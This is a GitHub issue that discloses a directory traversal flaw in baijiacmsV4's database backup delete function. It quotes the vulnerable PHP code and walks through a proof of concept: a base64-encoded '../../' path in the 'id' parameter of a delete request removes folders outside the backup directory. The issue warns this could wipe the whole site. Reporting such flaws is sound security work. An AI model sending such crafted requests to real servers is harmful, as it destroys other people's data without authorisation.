## Description

![@Ke7b3r0s](https://avatars.githubusercontent.com/u/30497080?u=57f01086c92247e9d9fbc53ffa2b9f89da44f68b&v=4&size=48)[Ke7b3r0s](https://github.com/Ke7b3r0s)opened [on Sep 19, 2020](https://github.com/baijiacms/baijiacmsV4/issues/6#issue-704832797)

Directory traversal vulnerability in baijiacmsV4 allows remote authenticated attackers to delete arbitrary folders on the server via unspecified vectors.

Vulnerable code is in system/manager/class/web/database.php

```
if($operation=='delete')
 {
 		$d = base64_decode($_GP['id']);

 			$path = WEB_ROOT . '/config/data_backup/';
		if(is_dir($path . $d)) {
			rmdirs($path . $d);
			message('备份删除成功！', create_url('site', array('act' => 'manager','do' => 'database','op'=>'restore')),'success');
		}
}

```

The origin request is `http://127.0.0.1:8888/baijiacms/index.php?mod=site&act=manager&do=database&op=delete&id=MTYwMDQ5ODY5OV9RejQzQmhaOQ%3D%3D&beid=1`,which is used to delete database backuped folder.We can change the parameter "id" to delete any folders.

For example:

1. Create a folder named test

   [![image](https://user-images.githubusercontent.com/30497080/93662183-c96fbf80-fa90-11ea-9f0b-3f1e79cb1c38.png)](https://user-images.githubusercontent.com/30497080/93662183-c96fbf80-fa90-11ea-9f0b-3f1e79cb1c38.png)
2. Base64encode "../../test"

   [![image](https://user-images.githubusercontent.com/30497080/93662206-0c319780-fa91-11ea-8c05-ea4f18301175.png)](https://user-images.githubusercontent.com/30497080/93662206-0c319780-fa91-11ea-8c05-ea4f18301175.png)
3. Change the parameter id to "Li4vLi4vdGVzdA%3d%3d" and request this url "<http://127.0.0.1:8888/baijiacms/index.php?mod=site&act=manager&do=database&op=delete&id=Li4vLi4vdGVzdA%3d%3d&beid=1>"

   [![image](https://user-images.githubusercontent.com/30497080/93662276-8b26d000-fa91-11ea-98df-c7aa45facac0.png)](https://user-images.githubusercontent.com/30497080/93662276-8b26d000-fa91-11ea-98df-c7aa45facac0.png)
4. Now the test folder is deleted.

   [![image](https://user-images.githubusercontent.com/30497080/93662294-a8f43500-fa91-11ea-8641-d17ff59a5916.png)](https://user-images.githubusercontent.com/30497080/93662294-a8f43500-fa91-11ea-8641-d17ff59a5916.png)
5. An authenticated attacker can destroy the whole website just use the parameter "../../../" after base64encode.
